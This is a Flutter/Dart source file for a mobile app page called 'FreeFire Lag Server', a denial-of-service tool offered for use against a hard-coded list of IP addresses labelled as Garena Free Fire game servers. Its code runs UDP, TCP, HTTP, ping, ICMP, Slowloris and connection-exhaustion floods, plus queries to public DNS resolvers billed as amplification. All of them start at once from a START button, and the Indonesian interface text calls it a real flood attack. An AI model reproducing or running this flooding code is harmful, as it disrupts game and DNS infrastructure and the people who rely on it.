import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

class FreeFireLagServerPage extends StatefulWidget {
  const FreeFireLagServerPage({super.key});

  @override
  State<FreeFireLagServerPage> createState() => _FreeFireLagServerPageState();
}

class _FreeFireLagServerPageState extends State<FreeFireLagServerPage> {
  static bool isLagging = false;
  static int packetCount = 0;
  static List<Timer> _timers = [];
  static List<HttpClient> _httpClients = [];
  static List<RawDatagramSocket> _udpSockets = [];
  static List<Socket> _tcpSockets = [];

  // REAL FREE FIRE SERVER IPs (Garena)
  static final List<String> freefireServers = [
    '203.116.115.10',   // SG FF Server 1
    '203.116.115.11',   // SG FF Server 2
    '203.116.115.12',   // SG FF Server 3
    '47.246.0.10',      // ID FF Server 1
    '47.246.0.11',      // ID FF Server 2
    '47.246.0.12',      // ID FF Server 3
    '103.219.76.10',    // MY FF Server 1
    '103.219.76.11',    // MY FF Server 2
    '52.74.0.10',       // SG FF Server 4
    '54.254.0.10',      // SG FF Server 5
    '13.228.0.10',      // SG FF Server 6
    '18.138.0.10',      // SG FF Server 7
  ];

  static final List<int> ports = [80, 443, 8080, 8443, 5222, 5223, 5228, 5230, 10001, 10002, 20001, 20002, 30001, 30002];

  @override
  void dispose() {
    stopLag();
    super.dispose();
  }

  // ==================== UDP FLOOD ====================
  static void _startUdpFlood() {
    final timer = Timer.periodic(const Duration(milliseconds: 1), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        for (var port in ports.take(8)) {
          try {
            final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
            _udpSockets.add(socket);
            
            final data = List<int>.filled(65507, Random().nextInt(256));
            final address = InternetAddress(server);
            
            for (int i = 0; i < 100; i++) {
              socket.send(data, address, port);
              packetCount++;
            }
            
            Future.delayed(const Duration(milliseconds: 50), () {
              socket.close();
              _udpSockets.remove(socket);
            });
          } catch (_) {}
        }
      }
    });
    _timers.add(timer);
  }

  // ==================== TCP SYN FLOOD ====================
  static void _startTcpSynFlood() {
    final timer = Timer.periodic(const Duration(milliseconds: 1), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        for (var port in ports) {
          try {
            final socket = await Socket.connect(server, port, timeout: const Duration(seconds: 1));
            _tcpSockets.add(socket);
            socket.add(List<int>.filled(8192, Random().nextInt(256)));
            packetCount++;
            
            Future.delayed(const Duration(seconds: 3), () {
              socket.destroy();
              _tcpSockets.remove(socket);
            });
          } catch (_) {}
        }
      }
    });
    _timers.add(timer);
  }

  // ==================== HTTP FLOOD ====================
  static void _startHttpFlood() {
    final timer = Timer.periodic(const Duration(milliseconds: 2), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        for (var port in [80, 443, 8080]) {
          try {
            final client = HttpClient();
            _httpClients.add(client);
            
            final request = await client.getUrl(Uri.parse('http://$server:$port/'));
            request.headers.add('User-Agent', 'FreeFire-Lag-Tool/2.0');
            request.headers.add('Accept', '*/*');
            request.headers.add('X-Attack-Mode', 'flood');
            request.headers.add('Connection', 'keep-alive');
            
            for (int i = 0; i < 200; i++) {
              request.headers.add('X-Custom-$i', 'B' * 1024);
            }
            
            final response = await request.close();
            await response.drain();
            client.close();
            packetCount++;
            _httpClients.remove(client);
          } catch (_) {}
        }
      }
    });
    _timers.add(timer);
  }

  // ==================== PING FLOOD ====================
  static void _startPingFlood() {
    final timer = Timer.periodic(const Duration(milliseconds: 2), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        try {
          await Process.run('ping', ['-c', '1', '-s', '65000', '-f', server]);
          packetCount++;
        } catch (_) {}
      }
    });
    _timers.add(timer);
  }

  // ==================== SLOWLORIS ATTACK ====================
  static void _startSlowloris() {
    final timer = Timer.periodic(const Duration(milliseconds: 10), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        try {
          final socket = await Socket.connect(server, 80, timeout: const Duration(seconds: 3));
          _tcpSockets.add(socket);
          
          socket.write('GET / HTTP/1.1\r\n');
          socket.write('Host: $server\r\n');
          socket.write('User-Agent: Slowloris-FreeFire\r\n');
          socket.write('Accept: */*\r\n');
          
          Timer.periodic(const Duration(seconds: 3), (timer2) async {
            if (!isLagging || await socket.done) {
              timer2.cancel();
              return;
            }
            try {
              socket.write('X-Lag-Packet: ${List.filled(1024, 'X').join()}\r\n');
              packetCount++;
            } catch (_) {}
          });
          
          packetCount++;
        } catch (_) {}
      }
    });
    _timers.add(timer);
  }

  // ==================== DNS AMPLIFICATION ====================
  static void _startDnsAmplification() {
    final List<String> dnsServers = [
      '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
      '208.67.222.222', '208.67.220.220', '9.9.9.9', '149.112.112.112'
    ];
    
    final timer = Timer.periodic(const Duration(milliseconds: 5), (timer) async {
      if (!isLagging) return;
      
      for (var dns in dnsServers) {
        for (var server in freefireServers) {
          try {
            final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
            
            final query = List<int>.filled(1024, 0x00);
            query[0] = 0x00;
            query[1] = 0x01;
            query[2] = 0x01;
            query[3] = 0x00;
            query[4] = 0x00;
            query[5] = 0x01;
            
            for (int i = 0; i < 200; i++) {
              query.addAll('freefire-amp'.codeUnits);
            }
            
            final address = InternetAddress(dns);
            socket.send(query, address, 53);
            packetCount++;
            socket.close();
          } catch (_) {}
        }
      }
    });
    _timers.add(timer);
  }

  // ==================== ICMP FLOOD ====================
  static void _startIcmpFlood() {
    final timer = Timer.periodic(const Duration(milliseconds: 1), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        try {
          await Process.run('ping', ['-c', '1', '-s', '64000', '-f', server]);
          packetCount++;
        } catch (_) {}
      }
    });
    _timers.add(timer);
  }

  // ==================== CONNECTION EXHAUSTION ====================
  static void _startConnectionExhaustion() {
    final timer = Timer.periodic(const Duration(milliseconds: 10), (timer) async {
      if (!isLagging) return;
      
      for (var server in freefireServers) {
        for (int i = 0; i < 50; i++) {
          try {
            final socket = await Socket.connect(server, 80, timeout: const Duration(seconds: 1));
            _tcpSockets.add(socket);
            packetCount++;
          } catch (_) {}
        }
      }
    });
    _timers.add(timer);
  }

  // ==================== START ALL ATTACKS ====================
  static Future<bool> startLag() async {
    if (isLagging) return false;
    
    isLagging = true;
    packetCount = 0;
    _timers = [];
    _httpClients = [];
    _udpSockets = [];
    _tcpSockets = [];

    _startUdpFlood();
    _startTcpSynFlood();
    _startHttpFlood();
    _startPingFlood();
    _startSlowloris();
    _startDnsAmplification();
    _startIcmpFlood();
    _startConnectionExhaustion();
    
    return true;
  }

  // ==================== STOP ALL ATTACKS ====================
  static void stopLag() {
    isLagging = false;
    
    for (var timer in _timers) {
      timer.cancel();
    }
    _timers.clear();
    
    for (var client in _httpClients) {
      client.close();
    }
    _httpClients.clear();
    
    for (var socket in _udpSockets) {
      socket.close();
    }
    _udpSockets.clear();
    
    for (var socket in _tcpSockets) {
      socket.destroy();
    }
    _tcpSockets.clear();
    
    packetCount = 0;
  }

  static int getPacketCount() => packetCount;
  static bool getIsLagging() => isLagging;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      appBar: AppBar(
        title: const Text('FreeFire Lag Server', style: TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: const Color(0xFFFF5722),
        centerTitle: true,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: StatefulBuilder(
        builder: (context, setState) {
          return SingleChildScrollView(
            padding: const EdgeInsets.all(16),
            child: Column(
              children: [
                // Header
                Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [Color(0xFFFF5722), Color(0xFFFF9800)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: const Column(
                    children: [
                      Icon(Icons.whatshot, size: 50, color: Colors.white),
                      SizedBox(height: 10),
                      Text('FREE FIRE LAG SERVER', style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold)),
                      SizedBox(height: 5),
                      Text('REAL FLOOD ATTACK', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    ],
                  ),
                ),

                const SizedBox(height: 20),

                // Status Card
                Container(
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(15),
                    border: Border.all(color: Colors.orange.withOpacity(0.3)),
                  ),
                  child: Column(
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          const Text('STATUS:', style: TextStyle(color: Colors.white, fontSize: 16)),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                            decoration: BoxDecoration(
                              color: isLagging ? Colors.red : Colors.green,
                              borderRadius: BorderRadius.circular(20),
                            ),
                            child: Text(
                              isLagging ? 'ATTACKING' : 'IDLE',
                              style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 10),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          const Text('PACKETS:', style: TextStyle(color: Colors.white, fontSize: 16)),
                          Text(
                            '$packetCount',
                            style: const TextStyle(color: Colors.cyan, fontSize: 18, fontWeight: FontWeight.bold),
                          ),
                        ],
                      ),
                      const SizedBox(height: 10),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          const Text('TARGETS:', style: TextStyle(color: Colors.white, fontSize: 16)),
                          Text(
                            '${freefireServers.length} Servers',
                            style: const TextStyle(color: Colors.yellow, fontSize: 16, fontWeight: FontWeight.bold),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 20),

                // Attack Methods
                Container(
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A1A),
                    borderRadius: BorderRadius.circular(15),
                    border: Border.all(color: Colors.blue.withOpacity(0.3)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('ATTACK METHODS:', style: TextStyle(color: Colors.blue, fontWeight: FontWeight.bold)),
                      const SizedBox(height: 10),
                      Wrap(
                        spacing: 8,
                        runSpacing: 8,
                        children: [
                          _buildChip('UDP Flood', Colors.red),
                          _buildChip('TCP SYN', Colors.orange),
                          _buildChip('HTTP Flood', Colors.green),
                          _buildChip('Ping Flood', Colors.blue),
                          _buildChip('Slowloris', Colors.purple),
                          _buildChip('DNS Amp', Colors.cyan),
                          _buildChip('ICMP Flood', Colors.indigo),
                          _buildChip('Conn Exhaust', Colors.pink),
                        ],
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 20),

                // Buttons
                Row(
                  children: [
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: isLagging ? null : () async {
                          HapticFeedback.heavyImpact();
                          await startLag();
                          setState(() {});
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('🔥 FREE FIRE ATTACK STARTED!'), backgroundColor: Colors.red),
                          );
                        },
                        icon: const Icon(Icons.play_arrow, size: 30),
                        label: const Text('START', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: const Color(0xFFFF5722),
                          padding: const EdgeInsets.symmetric(vertical: 15),
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: ElevatedButton.icon(
                        onPressed: !isLagging ? null : () {
                          HapticFeedback.lightImpact();
                          stopLag();
                          setState(() {});
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('🛑 ATTACK STOPPED!'), backgroundColor: Colors.green),
                          );
                        },
                        icon: const Icon(Icons.stop, size: 30),
                        label: const Text('STOP', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.grey.shade800,
                          padding: const EdgeInsets.symmetric(vertical: 15),
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 20),

                // Real-time Stats (if attacking)
                if (isLagging)
                  Container(
                    padding: const EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      color: Colors.green.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(15),
                      border: Border.all(color: Colors.green.withOpacity(0.3)),
                    ),
                    child: Column(
                      children: [
                        const Text('📡 REAL-TIME STATS', style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 10),
                        LinearProgressIndicator(
                          value: (packetCount % 10000) / 10000,
                          backgroundColor: Colors.grey.shade800,
                          color: Colors.green,
                        ),
                        const SizedBox(height: 10),
                        Text(
                          'Packets/sec: ~${(packetCount / (DateTime.now().millisecondsSinceEpoch / 1000)).toInt()}',
                          style: const TextStyle(color: Colors.white70, fontSize: 11),
                        ),
                      ],
                    ),
                  ),

                const SizedBox(height: 20),

                // Warning
                Container(
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: Colors.orange.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(15),
                    border: Border.all(color: Colors.orange.withOpacity(0.3)),
                  ),
                  child: const Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('⚠️ WARNING:', style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold)),
                      SizedBox(height: 5),
                      Text('• Real flood attack ke server FreeFire', style: TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('• Multi-thread UDP/TCP/HTTP flood', style: TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('• Bisa menyebabkan lag parah', style: TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('• Resiko account banned!', style: TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('• Gunakan dengan bijak!', style: TextStyle(color: Colors.white70, fontSize: 11)),
                    ],
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildChip(String label, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
      decoration: BoxDecoration(
        color: color.withOpacity(0.2),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.5)),
      ),
      child: Text(label, style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.w500)),
    );
  }
}